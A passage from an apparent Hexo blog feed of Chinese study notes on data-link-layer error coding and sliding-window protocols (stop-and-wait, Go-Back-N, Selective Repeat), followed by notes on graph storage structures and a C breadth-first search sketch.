style="zoom:80%;" /></center><h6 id="4-违规编码法"><a href="#4-违规编码法" class="headerlink" title="4.违规编码法"></a>4.违规编码法</h6><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9B%9B/7.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="4-差错编码"><a href="#4-差错编码" class="headerlink" title="4.差错编码"></a>4.差错编码</h4><ul><li><h6 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h6></li></ul><p>&emsp;&emsp;概括来说，传输中的差错都是由于噪声引起的</p><p>&emsp;&emsp;全局性：由于线路本身电气性质所产生的随机噪声（热噪声），是信道固有的，随机存在的。解决办法是提高信噪比来减少或避免干扰（对传感器下手）</p><p>&emsp;&emsp;局部性：外界特定的短暂原因所造成的冲击噪音，是产生差错的主要原因。解决办法是通常利用编码技术来解决</p><ul><li><h6 id="差错控制的相关分类"><a href="#差错控制的相关分类" class="headerlink" title="差错控制的相关分类"></a>差错控制的相关分类</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9B%9B/8.png" style="zoom:80%;" /></center><ul><li><h6 id="差错控制的编码方法"><a href="#差错控制的编码方法" class="headerlink" title="差错控制的编码方法"></a>差错控制的编码方法</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9B%9B/9.png" style="zoom:80%;" /></center><p>&emsp;&emsp;&emsp;冗余编码：在数据发送前，先按某种关系附加上一定的冗余位，构成一个符合某一规则的码字后再发送。当要发送的有效数据变化时，相应的冗余位也随之辩护，使得码字遵从不变的规则，接收端根据收到码字是否符合原规则，从而判断是否出错</p><p>&emsp;</p><h4 id="5-检错编码"><a href="#5-检错编码" class="headerlink" title="5.检错编码"></a>5.检错编码</h4><ul><li><h6 id="奇偶校验码"><a href="#奇偶校验码" class="headerlink" title="奇偶校验码"></a>奇偶校验码</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9B%9B/10.png" style="zoom:80%;" /></center><ul><li><h6 id="CRC循环冗余码"><a href="#CRC循环冗余码" class="headerlink" title="CRC循环冗余码"></a>CRC循环冗余码</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9B%9B/11.png" style="zoom:80%;" /></center><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9B%9B/12.png" style="zoom:80%;" /></center><p>&emsp;&emsp;在接收端检错过程中，会把收到的每一个帧都除以相同的除数，然后检查得到的余数R。如果余数为0，则判定这个帧没有差错进行接受；如果余数不为0，则判定这个帧有差错（无法确实到位）进行丢弃</p><p>&emsp;&emsp;FCS生成以及接受段CRC检验都是由硬件实现，处理很迅速，因此不会延误数据的传输</p><p>&emsp;</p><h4 id="6-纠错编码"><a href="#6-纠错编码" class="headerlink" title="6.纠错编码"></a>6.纠错编码</h4><ul><li><h6 id="海明距离"><a href="#海明距离" class="headerlink" title="海明距离"></a>海明距离</h6></li></ul><p>&emsp;&emsp;两个合法编码（码字）的对应比特取值不同的比特数称为这两个码字的海明距离（码距），一个有效编码集中，任意两个合法编码（码字）的海明距离的最小值称为该编码集的海明距离（码距）</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9B%9B/13.png" style="zoom:80%;" /></center><ul><li><h6 id="确定校验码位数r"><a href="#确定校验码位数r" class="headerlink" title="确定校验码位数r"></a>确定校验码位数r</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9B%9B/14.png" style="zoom:80%;" /></center><p>&emsp;&emsp;假设数据的位数m=4，那么满足不等式的最小r为3，也就D=1100的海明码应该有4+3=7位，其中原数据4位，校验码3位</p><ul><li><h6 id="确定校验码和数据的位置"><a href="#确定校验码和数据的位置" class="headerlink" title="确定校验码和数据的位置"></a>确定校验码和数据的位置</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9B%9B/15.png" style="zoom:80%;" /></center><ul><li><h6 id="求出校验码的值"><a href="#求出校验码的值" class="headerlink" title="求出校验码的值"></a>求出校验码的值</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9B%9B/16.png" style="zoom:80%;" /></center><ul><li><h6 id="检错并纠错"><a href="#检错并纠错" class="headerlink" title="检错并纠错"></a>检错并纠错</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9B%9B/17.png" style="zoom:80%;" /></center><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9B%9B/18.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="7-流量控制"><a href="#7-流量控制" class="headerlink" title="7.流量控制"></a>7.流量控制</h4><p>&emsp;&emsp;在现实中，较高的发送速度和较低的接收能力的不匹配，会造成传输出错，因此流量控制也是数据链路层的一项重要工作。</p><p>&emsp;&emsp;数据链路层的流量控制是点对点的，其控制手段是接收方收不下就不回复确认</p><p>&emsp;&emsp;传输层的流量控制是端到端的，其控制手段是接收端给发送端一个窗口公告</p><ul><li><h6 id="三种协议"><a href="#三种协议" class="headerlink" title="三种协议"></a>三种协议</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9B%9B/20.png" style="zoom:80%;" /></center><p>&emsp;&emsp;停止—等待协议：发送窗口大小=1，接收窗口大小=1</p><p>&emsp;&emsp;后退N帧协议（GBN）：发送窗口大小&gt;1，接收窗口大小=1</p><p>&emsp;&emsp;选择重传协议（SR）：发送窗口大小＞1，接收窗口大小＞1</p><ul><li><h6 id="可靠传输"><a href="#可靠传输" class="headerlink" title="可靠传输"></a>可靠传输</h6></li></ul><p>&emsp;&emsp;发送端发啥，接收端就收啥</p><ul><li><h6 id="流量控制"><a href="#流量控制" class="headerlink" title="流量控制"></a>流量控制</h6></li></ul><p>&emsp;&emsp;控制发送速率，使得接收方有足够的缓冲空间来接收每一帧</p><ul><li><h6 id="滑动窗口"><a href="#滑动窗口" class="headerlink" title="滑动窗口"></a>滑动窗口</h6></li></ul><p>&emsp;&emsp;滑动窗口的解决依靠流量控制和可靠传输，通过流量控制如果收不下就不给确认，让发送方想发也发不了，以及依靠可靠传输让发送方自动重传</p><p>&emsp;</p><h4 id="8-停止—等待协议"><a href="#8-停止—等待协议" class="headerlink" title="8.停止—等待协议"></a>8.停止—等待协议</h4><ul><li><h6 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h6></li></ul><p>&emsp;&emsp;在传输过程中，除了比特出现差错，底层通信还会出现丢包问题。为了实现流量控制而产生</p><p>&emsp;&emsp;丢包：物理线路故障、设备故障、病毒攻击、路由信息 错误等原因，会导致数据包的丢失</p><ul><li><h6 id="无差错情况"><a href="#无差错情况" class="headerlink" title="无差错情况"></a>无差错情况</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9B%9B/21.png" style="zoom:80%;" /></center><ul><li><h6 id="有差错情况"><a href="#有差错情况" class="headerlink" title="有差错情况"></a>有差错情况</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9B%9B/22.png" style="zoom:80%;" /></center><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9B%9B/23.png" style="zoom:80%;" /></center><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9B%9B/24.png" style="zoom:80%;" /></center><ul><li><h6 id="性能分析"><a href="#性能分析" class="headerlink" title="性能分析"></a>性能分析</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9B%9B/25.png" style="zoom:80%;" /></center><ul><li><h6 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9B%9B/26.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="9-后退N帧协议（GBN）"><a href="#9-后退N帧协议（GBN）" class="headerlink" title="9.后退N帧协议（GBN）"></a>9.后退N帧协议（GBN）</h4><p>&emsp;&emsp;由于停止—等待协议的利用率不高，作为流水线技术，存在一定弊端，所以出现了新的协议</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9B%9B/27.png" style="zoom:80%;" /></center><ul><li><h6 id="GBN发送方必须响应的三件事"><a href="#GBN发送方必须响应的三件事" class="headerlink" title="GBN发送方必须响应的三件事"></a>GBN发送方必须响应的三件事</h6></li></ul><p>&emsp;&emsp;1、上层的调用：</p><p>&emsp;&emsp;上层要发送数据时，发送方先检查发送窗口是否已满，如果未满，则产生一个帧并将其发送，如果窗口已满，则发送方只需将数据返回给上层，暗示上层窗口已满。上层等一会再发送。（实际实现中，发送方可以缓存这些数据，在窗口不满时再发送帧）</p><p>&emsp;&emsp;2、收到了一个ACK：</p><p>&emsp;&emsp;GBN协议中，对n号帧的确认采用累计确认的方式，标明接收方已经在收到n号帧和它之前的全部帧</p><p>&emsp;&emsp;3、超时事件：</p><p>&emsp;&emsp;协议的名字为后退N帧/回退N帧，开源于出现丢失和时延过长帧时发送方的行为。就像在停等协议中的一样，定时器将再次用于恢复数据帧或确认帧的丢失。如果出现超时，发送方重传所有已发送但未被确认的帧</p><ul><li><h6 id="GBN接收方响应的事"><a href="#GBN接收方响应的事" class="headerlink" title="GBN接收方响应的事"></a>GBN接收方响应的事</h6></li></ul><p>&emsp;&emsp;1、发送ACK：</p><p>&emsp;&emsp;如果正确收到n号帧，并且按序，那么接收方为n帧发送一个ACK，并将该帧中 的数据部分交付给上层</p><p>&emsp;&emsp;2、维护expectedseqnum信息</p><p>&emsp;&emsp;其余情况都丢弃帧，并为最近按序接收的帧重新发送ACK。接收方无需缓存任 何失序帧，只需要维护一个信息：expectedseqnum（下一个按序接收的帧序 号）</p><ul><li><h6 id="GBN运行效果"><a href="#GBN运行效果" class="headerlink" title="GBN运行效果"></a>GBN运行效果</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9B%9B/28.png" style="zoom:80%;" /></center><ul><li><h6 id="滑动窗口长度限制"><a href="#滑动窗口长度限制" class="headerlink" title="滑动窗口长度限制"></a>滑动窗口长度限制</h6></li></ul><p>&emsp;&emsp;若采用n个比特对帧编号，那么发送窗口的尺寸WT 应满足：1≤ WT≤2^n-1。因为发送窗口尺寸过大，就会使得接收方无法区别新帧和旧帧。</p><ul><li><h6 id="特点总结"><a href="#特点总结" class="headerlink" title="特点总结"></a>特点总结</h6></li></ul><p>&emsp;&emsp;1、累积确认</p><p>&emsp;&emsp;2、接收方只按顺序接收帧，不按序无情丢弃</p><p>&emsp;&emsp;3、确认序列号最大的，按序到达的帧</p><p>&emsp;&emsp;4、发送窗口最大为2^n-1，接收窗口大小为1</p><ul><li><h6 id="性能分析-1"><a href="#性能分析-1" class="headerlink" title="性能分析"></a>性能分析</h6></li></ul><p>&emsp;&emsp;优点是因连续发送数据帧而提高了信道利用率，缺点是在重传时必须吧原来已经正确传送的数据帧重传，使得传送效率降低</p><ul><li><h6 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9B%9B/29.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="10-选择重传协议（SR）"><a href="#10-选择重传协议（SR）" class="headerlink" title="10.选择重传协议（SR）"></a>10.选择重传协议（SR）</h4><p>&emsp;&emsp;在GBN协议中，尽管有了改进，但是为了实现能不能只重传出错的帧从而提高传输效率的思想，提出了SR协议，通过设置单个确认，同时加大接收窗口，设置接收缓存，缓存乱序到达的帧</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9B%9B/30.png" style="zoom:80%;" /></center><ul><li><h6 id="SR发送方必须响应的三件事"><a href="#SR发送方必须响应的三件事" class="headerlink" title="SR发送方必须响应的三件事"></a>SR发送方必须响应的三件事</h6></li></ul><p>&emsp;&emsp;1、上层的调用：</p><p>&emsp;&emsp;从上层收到数据后，SR发送方检查下一个可用于该帧的序号，如果序号位于发送窗口内，则发送数据帧；否则就像GBN一样，要么将数据缓存，要么返回给上层之后再传输</p><p>&emsp;&emsp;2、收到一个ACK</p><p>&emsp;&emsp;如果收到ACK，加入该帧序号在窗口内，则SR发送方将那个被确认的帧标记为已接收。如果是该帧序号是窗口的下界（最左边第一个窗口对应 的序号），则窗口向前移动到具有最小序号的未确认帧处。如果窗口移动了并且有序号在窗口内的未发送帧，则发送这些帧</p><p>&emsp;&emsp;3、超时事件</p><p>&emsp;&emsp;每个帧都有自己的定时器，一个超时事件发送后只重传一个帧</p><ul><li><h6 id="SR接收方响应的事"><a href="#SR接收方响应的事" class="headerlink" title="SR接收方响应的事"></a>SR接收方响应的事</h6></li></ul><p>&emsp;&emsp;来者不拒：SR接收方将确认一个正确接收的帧而不管其是否按序。失序的帧将被缓存，并返回给发送方一个该帧的确认帧【收谁确认谁】，直到所有帧（即序号更小的帧）皆被收到为止，这时才可以将一批帧按序交付给上层，然后向前移动滑动窗口</p><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9B%9B/31.png" style="zoom:80%;" /></center><p>&emsp;&emsp;如果收到了窗口序号外（小于窗口下界）的帧，就返回一个ACK，其他情况，就忽略该帧</p><ul><li><h6 id="SR运行效果"><a href="#SR运行效果" class="headerlink" title="SR运行效果"></a>SR运行效果</h6></li></ul><center><img src="/img/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9B%9B/32.png" style="zoom:80%;" /></center><ul><li><h6 id="滑动窗口长度限制-1"><a href="#滑动窗口长度限制-1" class="headerlink" title="滑动窗口长度限制"></a>滑动窗口长度限制</h6></li></ul><p>&emsp;&emsp;发送窗口最好等于接收窗口。（大了会溢出，小了没意义）</p><p>&emsp;&emsp;WTmax=WRmax=2^(n−1)</p><ul><li><h6 id="特点总结-1"><a href="#特点总结-1" class="headerlink" title="特点总结"></a>特点总结</h6></li></ul><p>&emsp;&emsp;1、对数据帧逐一确认，收一个确认一个</p><p>&emsp;&emsp;2、只重传出错帧</p><p>&emsp;&emsp;3、接收方有缓存</p><p>&emsp;&emsp;4、WTmax=WRmax=2^(n−1)</p><p>&emsp;</p>]]></content>
    
    
    <categories>
      
      <category>计算机网络学习笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>图</title>
    <link href="/2022/10/28/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/"/>
    <url>/2022/10/28/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/</url>
    
    <content type="html"><![CDATA[<h1 id="图"><a href="#图" class="headerlink" title="图"></a>图</h1><h4 id="1-图的定义"><a href="#1-图的定义" class="headerlink" title="1.图的定义"></a>1.图的定义</h4><p>&emsp;&emsp;图G由顶点集V和边集E组成，记为G=（V,E），其中V（G）表示图G中顶点的有限非空集；E(G)表示图G中顶点之间的关系（边）集合。若V={V1,V2,V3,···,Vn}，则用|V|表示图G中顶点的个数，也称图G的阶，E={(u,v)|u∈V,v∈V}，则|E|表示图G中边的条数</p><p>&emsp;&emsp;注意：线性表可以是空表，数可以说空树，但是u不可以是空，也就是其中的V一定是非空集</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/1.jpg" style="zoom:80%;" /></center><ul><li><h6 id="有向图"><a href="#有向图" class="headerlink" title="有向图"></a>有向图</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/2.jpg" style="zoom:80%;" /></center><ul><li><h6 id="无向图"><a href="#无向图" class="headerlink" title="无向图"></a>无向图</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/3.jpg" style="zoom:80%;" /></center><ul><li><h6 id="度"><a href="#度" class="headerlink" title="度"></a>度</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/4.jpg" style="zoom:80%;" /></center><ul><li><h6 id="路径"><a href="#路径" class="headerlink" title="路径"></a>路径</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/5.jpg" style="zoom:80%;" /></center><ul><li><h6 id="连通图"><a href="#连通图" class="headerlink" title="连通图"></a>连通图</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/6.jpg" style="zoom:80%;" /></center><ul><li><h6 id="子图"><a href="#子图" class="headerlink" title="子图"></a>子图</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/7.jpg" style="zoom:80%;" /></center><ul><li><h6 id="连通分量"><a href="#连通分量" class="headerlink" title="连通分量"></a>连通分量</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/8.jpg" style="zoom:80%;" /></center><ul><li>强连通分量</li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/9.jpg" style="zoom:80%;" /></center><ul><li><h6 id="特殊的图"><a href="#特殊的图" class="headerlink" title="特殊的图"></a>特殊的图</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/10.jpg" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/11.jpg" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/12.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="2-图的存储——邻接矩阵法"><a href="#2-图的存储——邻接矩阵法" class="headerlink" title="2.图的存储——邻接矩阵法"></a>2.图的存储——邻接矩阵法</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxVertexum 100</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> Vex[MaxVertexNum];     <span class="hljs-comment">//顶点表</span><br>    <span class="hljs-type">int</span> Edge[MaxVertexNum][MaxVertexNum];  <span class="hljs-comment">//邻接矩阵边表</span><br>    <span class="hljs-type">int</span> vexnum,arcnum;              <span class="hljs-comment">//图当前顶点数和边数</span><br>&#125;MGraph;<br></code></pre></td></tr></table></figure><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/13.jpg" style="zoom:80%;" /></center><ul><li><h6 id="邻接矩阵法存储带权图"><a href="#邻接矩阵法存储带权图" class="headerlink" title="邻接矩阵法存储带权图"></a>邻接矩阵法存储带权图</h6></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxVertexum 100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INFINITY 最大的int值  <span class="hljs-comment">//可用int的上限值表示“无穷”</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> VertexType;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> EdgeType;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    VertexType Vex[MaxVertexNum];     <span class="hljs-comment">//顶点表</span><br>    EdgeType Edge[MaxVertexNum][MaxVertexNum];  <span class="hljs-comment">//邻接矩阵边表</span><br>    <span class="hljs-type">int</span> vexnum,arcnum;              <span class="hljs-comment">//图当前顶点数和边数</span><br>&#125;MGraph;<br></code></pre></td></tr></table></figure><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/14.jpg" style="zoom:80%;" /></center><ul><li><h6 id="性能分析"><a href="#性能分析" class="headerlink" title="性能分析"></a>性能分析</h6></li></ul><p>&emsp;&emsp;空间复杂度为：O(|V|²)  ——只和顶点数相关，和实际的边数无关</p><p>&emsp;&emsp;可以看见在矩阵图存储中，会存在没有边的情况，如果一个图的边过少，则会浪费大量的存储空间，所以这种存储方式适用于存储稠密图，注：无向图的邻接矩阵是对称矩阵，可以压缩存储（只存储上三角区/下三角区）</p><ul><li><h6 id="性质分析"><a href="#性质分析" class="headerlink" title="性质分析"></a>性质分析</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/15.jpg" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/16.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="3-邻接表法（顺序-链式）"><a href="#3-邻接表法（顺序-链式）" class="headerlink" title="3.邻接表法（顺序+链式）"></a>3.邻接表法（顺序+链式）</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//用邻接表存储的图</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    AdjList vertices;<br>    <span class="hljs-type">int</span> vexnum,arcnum;<br>&#125;ALGraph;<br><br><span class="hljs-comment">//边</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ArcNode</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int</span> adjvex;       <span class="hljs-comment">//边指向哪个结点</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ArcNode</span> *<span class="hljs-title">next</span>;</span> <span class="hljs-comment">//指向下一条边的指针</span><br>&#125;ArcNode；<br>    <br><span class="hljs-comment">//顶点</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VNode</span></span><br><span class="hljs-class">&#123;</span><br>    VertexType data;    <span class="hljs-comment">//顶点信息</span><br>    ArcNode *first;    <span class="hljs-comment">//第一条边</span><br>&#125;VNode,AdjList[MaxVertexNum];<br></code></pre></td></tr></table></figure><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/17.jpg" style="zoom:80%;" /></center><ul><li><h6 id="与邻接矩阵的对比"><a href="#与邻接矩阵的对比" class="headerlink" title="与邻接矩阵的对比"></a>与邻接矩阵的对比</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/18.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="4-十字链表法"><a href="#4-十字链表法" class="headerlink" title="4.十字链表法"></a>4.十字链表法</h4><p>&emsp;&emsp;十字链表法只能用于解决存储有向图</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/19.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;空间复杂度：O(|V|+|E|)</p><p>&emsp;</p><h4 id="5-邻接多重表"><a href="#5-邻接多重表" class="headerlink" title="5.邻接多重表"></a>5.邻接多重表</h4><p>&emsp;&emsp;邻接多重表只适 用于存储无向图</p><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/20.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;空间复杂度：O(|V|+|E|)</p><p>&emsp;</p><h4 id="6-四种方法比较"><a href="#6-四种方法比较" class="headerlink" title="6.四种方法比较"></a>6.四种方法比较</h4><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/21.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="7-图的基本操作"><a href="#7-图的基本操作" class="headerlink" title="7.图的基本操作"></a>7.图的基本操作</h4><p>&emsp;&emsp;Adjacent(G,x,y)：判断图G是否存在边或(x, y)。 </p><p>&emsp;&emsp;Neighbors(G,x)：列出图G中与结点x邻接的边。 </p><p>&emsp;&emsp;InsertVertex(G,x)：在图G中插入顶点x。 </p><p>&emsp;&emsp;DeleteVertex(G,x)：从图G中删除顶点x。 </p><p>&emsp;&emsp;AddEdge(G,x,y)：若无向边(x, y)或有向边不存在，则向图G中添加该边。 </p><p>&emsp;&emsp;RemoveEdge(G,x,y)：若无向边(x, y)或有向边存在，则从图G中删除该边。 </p><p>&emsp;&emsp;FirstNeighbor(G,x)：求图G中顶点x的第一个邻接点，若有则返回顶点号。若x没有邻接点 或图中不存在x，则返回-1。 </p><p>&emsp;&emsp;NextNeighbor(G,x,y)：假设图G中顶点y是顶点x的一个邻接点，返回除y之外顶点x的下一 个邻接点的顶点号，若y是x的最后一个邻接点，则返回-1。 </p><p>&emsp;&emsp;Get_edge_value(G,x,y)：获取图G中边(x, y)或对应的权值。 </p><p>&emsp;&emsp;Set_edge_value(G,x,y,v)：设置图G中边(x, y)或对应的权值为v。</p><h4 id="8-图的广度优先遍历算法"><a href="#8-图的广度优先遍历算法" class="headerlink" title="8.图的广度优先遍历算法"></a>8.图的广度优先遍历算法</h4><ul><li><h6 id="起初版"><a href="#起初版" class="headerlink" title="起初版"></a>起初版</h6></li></ul><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/22.jpg" style="zoom:80%;" /></center><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">bool</span> visited[MAX_VERTEX_NUM];<br><br><span class="hljs-comment">//广度优先遍历</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">BFS</span><span class="hljs-params">(Graph G,<span class="hljs-type">int</span> v)</span>          <span class="hljs-comment">//从顶点v出发，广度优先遍历图G</span><br>&#123;<br>    visit(v);                   <span class="hljs-comment">//访问初始结点v</span><br>    visited[v]=TRUE;            <span class="hljs-comment">//对v做已访问标记</span><br>    Enqueue(Q,v);               <span class="hljs-comment">//顶点v入队伍Q</span><br>    <span class="hljs-keyword">while</span>(!isEmpty(Q))          <br>    &#123;<br>        DeQueue(Q,v);        <span class="hljs-comment">//顶点v 出队列</span><br>        <span class="hljs-keyword">for</span>(w=FirstNeighbor(G,v);w&gt;=<span class="hljs-number">0</span>;w=NextNeighbor(G,v,w))<br>            <span class="hljs-comment">//检测v所有的邻接点</span><br>            <span class="hljs-keyword">if</span>(!visted[w])<br>            &#123;<br>                visit(w);            <span class="hljs-comment">//访问顶点w</span><br>                visit[w]=TRUE;       <span class="hljs-comment">//对w做已访问标记</span><br>                EnQueue(Q,w);       <span class="hljs-comment">//顶点w入队伍</span><br>            &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/23.jpg" style="zoom:80%;" /></center><center><img src="/img/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%85%AB/24.jpg" style="zoom:80%;" /></center><ul><li><h6 id="Final版"><a href="#Final版" class="headerlink" title="Final版"></a>Final版</h6></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 